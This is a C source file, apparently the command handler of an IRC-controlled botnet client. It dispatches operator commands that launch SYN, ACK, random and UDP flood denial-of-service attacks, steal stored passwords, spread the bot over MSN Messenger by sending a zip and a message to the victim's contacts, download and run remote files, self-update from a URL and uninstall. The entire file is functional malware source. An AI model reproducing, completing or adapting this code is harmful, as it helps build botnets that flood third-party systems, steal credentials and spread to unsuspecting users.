#include "../Headers/includes.h"
#include "../Config/cmds.h"
#include "../Headers/functions.h"

int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	char *a[MAX_TOKENS];
	char fcmd[1024];
	strcpy(fcmd,params);
	if (fcmd[0] == prefix)
	{
		int t=SplitParams(a,params,MAX_TOKENS);
		SWITCHES switches=GetSwitches(a,t);

		if (!a[0])
			return 1;

		if (a[0][0] == prefix)
		{
			a[0]++;
			IRC_CommandParse(a,t,fcmd,hostd,irc,switches,topic);
		}
		else
		{
			if (!silent)
				irc->pmsg(hostd->target,"%s Failed to parse command.","Failed");
			return 1;
		} 
	}

	return 1;
}

int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;
	int tnum, i;
	DWORD id;
	BOOL dec=FALSE;

	//topic
	if (topic)
	{
		if (!lstrcmpi(get_auth,a[0]))
			return 1;
		if (!lstrcmpi(cmd_logout,a[0]))
			return 1;
		if (!lstrcmpi(cmd_remove,a[0]))
			return 1;
	}

	// stops
	if (switches.stop)
	{
#ifndef NO_DDOS
		if (!lstrcmpi(cmd_ddos_syn, a[0]) || !lstrcmpi(cmd_ddos_ack, a[0]) || !lstrcmpi(cmd_ddos_random, a[0]))
		{
			stopthread(hostd->target, irc, switches.silent, switches.verbose, 0, DDOS_THREAD, "DDoS");
			return 1;
		}
#endif

		
#ifndef NO_DOWNLOAD
		else if (!lstrcmpi(get_mnd,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Download");
			return 1;
		}
		else if (!lstrcmpi(get_upd,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Update");
			return 1;
		}
#endif

#ifndef NO_PSTORE
		else if (!lstrcmpi(cmd_pstore_1, a[0]) || !lstrcmpi(cmd_pstore_2, a[0])) 
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,PSTORE_THREAD,"PStore");
			return 1;
		}
#endif

#ifndef NO_MSNSPREAD
		else if (!lstrcmpi(cmd_msnspread_1, a[0])) 
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0, MSN_THREAD,"MSN");
			return 1;
		}
		else if (!lstrcmpi(cmd_msnspread_2, a[0])) 
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0, MSNMSG_THREAD,"MSN MSG");
			return 1;
		}
#endif
	}



	//////////////////////////////////////////////////////////////////////////////
	//								Login
	//			At this point the user should already be logged in
	//////////////////////////////////////////////////////////////////////////////

	if (!lstrcmpi(a[0],get_auth))
	{
		if (switches.verbose)
			irc->pmsg(hostd->target,str_auth_ali,main_title);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Logout
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_LOGOUT_CMD
	if (!lstrcmpi(cmd_logout, a[0]))
	{
		if (a[1])
		{
			i = atoi(a[1]);
			if(i>=0 && i<MAX_LOGINS)
			{
				if (irc->del_login(i))
				{
					if (!switches.silent)
						irc->pmsg(hostd->target,str_sl_logout,main_title,i);
				}

				else
				{
					if (!switches.silent)
						irc->pmsg(hostd->target,str_sl_no_logout, main_title, i);
				}
			}
			else
			{
				if (!switches.silent)
					irc->pmsg(hostd->target,str_sl_in_logout, main_title, i);
			}
		}
		else
		{
			if (irc->del_login(hostd->nick,hostd->ident,hostd->host)!=-1)
			{
				if (!switches.silent)
					irc->pmsg(hostd->target,str_logout,main_title,hostd->nick);
			}
		}
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								Remove
	//					FIXME: Add unsecure (if enabled)
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_REMOVE_CMD
	else if (!lstrcmpi(a[0],cmd_remove))
	{
		uninstall();
		if (!switches.silent)
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
		else
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,"*");
		Sleep(FLOOD_DELAY);
		irc->disconnect();
		fWSACleanup();
		ExitProcess(EXIT_SUCCESS);
	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//								Visit
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_VISIT
	else if (!lstrcmpi(a[0],cmd_visit))
	{

		NTHREAD Visit;
		Visit.conn=irc;
		Visit.silent=switches.silent;
		Visit.verbose=switches.verbose;
		strcpy(Visit.target,hostd->target);
		Visit.data1=a[1];

		if (a[2] != NULL) strncpy(Visit.data2, a[2], sizeof(Visit.data2)-1);

		Visit.threadnum = addthread(VISIT_THREAD,"Visit Threads");
		if (threads[Visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&Visit, 0, &id))
		{
			while (Visit.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Visiting Website Now", visit_title);
		}


	}
#endif 

	//////////////////////////////////////////////////////////////////////////////
	//								pStore
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_PSTORE
	else if (!lstrcmpi(a[0],cmd_pstore_1) || !lstrcmpi(a[0],cmd_pstore_2))
	{
		if ((tnum=findthreadnum(PSTORE_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, pstore_title,"pstore thread", tnum);
			return 1;
		}

		NTHREAD PSTORE;
		PSTORE.conn=irc;
		PSTORE.silent=switches.silent;
		PSTORE.verbose=switches.verbose;

		if (!lstrcmpi(a[0],cmd_pstore_2)) {
			PSTORE.bdata1=TRUE;
			PSTORE.data1=a[1];
		}


		strcpy(PSTORE.target,hostd->target);
		PSTORE.threadnum = addthread(PSTORE_THREAD,"PStore Thread");
		if (threads[PSTORE.threadnum].tHandle = CreateThread(NULL, 0, &pstore, (LPVOID)&PSTORE, 0, &id))
		{
			while (PSTORE.gotinfo == FALSE)
				Sleep(50);
		}


	}
#endif 


	//////////////////////////////////////////////////////////////////////////////
	//								IM Spread
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_MSNSPREAD
	else if (!lstrcmpi(cmd_msnspread_1,a[0]))
	{


		if ((tnum=findthreadnum(MSN_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, msnspread_title,"msn thread", tnum);
			return 1;
		}

		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		msn.data1=a[1];		//EXE Name
		msn.data2=a[2];		//ZIP Name

		if (a[3]) {
			char *IMmessage = NULL;
 			IMmessage = strchr(params, ' ');
			IMmessage = strchr(IMmessage+1, ' ');
			IMmessage = strchr(IMmessage+1, ' ');
			msn.data3=IMmessage;	//Message
			msn.bdata1=false;
		} else {
			msn.bdata1=true;
		}

		strcpy(msn.target,hostd->target);
		msn.threadnum = addthread(MSN_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &MsnSpread, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
			if (a[3]) irc->pmsg(hostd->target,"%s Thread Activated: Sending Zipfile and Message.", msnspread_title);
			if (!a[3]) irc->pmsg(hostd->target,"%s Thread Activated: Sending Zipfile.", msnspread_title);

		}
	}
	else if (!lstrcmpi(cmd_msnspread_2,a[0]))
	{


		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		strcpy(msn.target,hostd->target);

		char *IMmessage;
 		if ( !( IMmessage = strchr(params, ' ')) )return 1;

		msn.data1=IMmessage; //Message
		msn.threadnum = addthread(MSNMSG_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &MsnMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Thread Activated: Sending Message.", msnspread_title);
		}



	}
	else if (!lstrcmpi(cmd_msnspread_3,a[0])) 
	{
	
		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		strcpy(msn.target,hostd->target);
		msn.threadnum = addthread(MSNMSG_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &MsnStats, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
		}

	}
	else if (!lstrcmpi(cmd_msnspread_4,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,msnspread_title);
			return 1;
		}
		AddContact(a[1]);
		if (!switches.silent)
			irc->pmsg(hostd->target, "%s address %s added to msn.", msnspread_title);
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								Download
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_DOWNLOAD
	else if (!lstrcmpi(get_mnd,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,download_title);
			return 1;
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,download_title,"transfer thread",tnum);
			return 1;
		}
		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=a[2];
		dl.bdata1 = FALSE;
		dl.bdata2 = (a[3]?TRUE:FALSE);
		dl.bdata3 = (a[4]?TRUE:FALSE);

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading URL: %s to: %s.",download_title,(dec?"*":a[1]),a[2]);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s Downloading URL: %s to: %s.",download_title,a[1],a[2]);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,download_title,"transfer thread",GetLastError());
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Update
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_UPDATE
	else if (!lstrcmpi(get_upd,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,update_title);
			return 1;
		}
		if (a[2])
		{
			if (!lstrcmpi(bid,a[2]))
			{
				return 1;
			}
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			return 1;
		}

		char tempdir[MAX_PATH], tmpbuf[MAX_PATH];
		GetTempPath(sizeof(tempdir), tempdir);
		sprintf(tmpbuf,"%seraseme_%d%d%d%d%d.exe",tempdir,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);

		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=tmpbuf;
		if (a[3]) dl.idata1=1;
		else	  dl.idata1=0;
		dl.bdata1 = TRUE;//update
		dl.bdata2 = FALSE;//run
		dl.bdata3 = FALSE;//run hidden

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading update from: %s to: %s.",update_title,(dec?"*":a[1]),dl.data2);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s Downloading update from: %s to: %s.",update_title,a[1],dl.data2);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,update_title,"transfer thread",GetLastError());
		}
		return 1;
	}
#endif // NO_UPDATE
#endif // NO_DOWNLOAD


	//////////////////////////////////////////////////////////////////////////////
	//								DDOS
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_DDOS
	else if (!lstrcmpi(cmd_ddos_syn,a[0]) || !lstrcmpi(cmd_ddos_ack,a[0]) || !lstrcmpi(cmd_ddos_random,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		DDOS ddos;
		sprintf(ddos.ip,	"%s", a[1]);
		sprintf(ddos.port,	"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);

		if (strcmp("ddos.syn", a[0]) == 0 )
			sprintf(ddos.type,"ddos.syn");
		else if (strcmp("ddos.random", a[0]) == 0 )
			sprintf(ddos.type,"ddos.random"); 	
		else	sprintf(ddos.type,"ddos.ack");
	
		ddos.notice = 0;//switches.halfsilent;
		ddos.silent = 0;//switches.silent;
		ddos.conn=irc;
		strcpy(ddos.target,hostd->target);

		ddos.threadnum = addthread(DDOS_THREAD,"%s Flooding %s:%s for %s seconds",ddos_title,a[1],a[2],a[3]);
		
		if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id))
		{
			while(ddos.gotinfo == FALSE)
			Sleep(50);
		}
		else
		{
			if (!ddos.silent)
				irc->pmsg(hostd->target,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());
			return 1;
		}
	}

#endif

#ifndef NO_SUPERSYN
	
	else if (!lstrcmpi(cmd_ddos_supersyn,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		SUPERSYN ddos;
		sprintf(ddos.ip,	"%s", a[1]);
		sprintf(ddos.port,	"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);

		ddos.notice = 0;//switches.halfsilent;
		ddos.silent = 0;//switches.silent;
		ddos.conn=irc;
		strcpy(ddos.target,hostd->target);

		ddos.threadnum = addthread(DDOS_THREAD,"%s Flooding %s:%s for %s seconds",ddos_title,a[1],a[2],a[3]);
		
		if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &SuperSynThread, (LPVOID)&ddos, 0, &id))
		{
			while(ddos.gotinfo == FALSE)
			Sleep(50);
		}
		else
		{
			if (!ddos.silent)
				irc->pmsg(hostd->target,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());
			return 1;
		}
	}
#endif
#ifndef NO_UDP
	else if (!lstrcmpi(cmd_ddos_udp,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		UDPFLOOD udps;
		udps.silent = 0;
		udps.notice = 0;
		strncpy(udps.host,  a[1], sizeof(udps.host)-1);
		udps.num = atoi(a[2]);
		udps.size = atoi(a[3]);
		udps.delay = atoi(a[4]);
		if (a[5] != NULL)
			udps.port = atoi(a[5]);
		else
			udps.port = 0;
		strncpy(udps.chan,  a[2], sizeof(udps.chan)-1);

		udps.threadnum = addthread(DDOS_THREAD, "[UDP] Sending %d packets to: %s. Packet size: %d, Delay: %d(ms)", udps.num, udps.host, udps.size, udps.delay);
		if (threads[udps.threadnum].tHandle = CreateThread(NULL, 0, &udp, (LPVOID)&udps, 0, &id)) {
			while(udps.gotinfo == FALSE)
				Sleep(50);
		} else
			irc->pmsg(hostd->target, "[UDP] Failed to start flood thread, error: <%d>", GetLastError());
	}
#endif
	//END OF PROGRAM.


	return 0;
}
